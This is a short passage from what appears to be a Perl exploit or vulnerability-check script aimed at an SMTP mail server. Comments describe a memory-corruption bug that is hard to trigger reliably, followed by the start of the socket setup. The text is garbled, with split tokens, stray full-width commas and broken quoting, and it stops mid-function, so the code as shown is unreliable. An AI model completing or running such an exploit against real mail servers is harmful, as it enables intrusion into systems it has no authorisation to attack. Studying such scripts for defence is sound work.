Reliably exploiting this bug is ，  # non-trivial ; even though the entire buffer is binary safe ( even nulls ) and can be ，  # just about any size , the actual code that crashes varies widely with each request. ，  # During the analysis process , numerous combinations of request size , concurrent ，  # requests , pre-allocations , and alternate trigger routes were examined and not a ，  # single duplicate of location and data offset was discovered. Hopefully the magic ，  # combination of data , size , and setup will be found to allow this bug to be reliably ，  # exploited. ，  # minor bugfix : look for 354 Send binary data ， use strict ;  ， use IO :  : Socket ;  ， my $ host = shift (  )  |  | usage (  )  ;  ， my $ mode = shift (  )  |  | \"CHECK\" ;  ， my $ port = 25 ;  ， usage (  )  ;  ， sub check ， my $ s = SMTP (  $ host ,  $ port )  ; ",
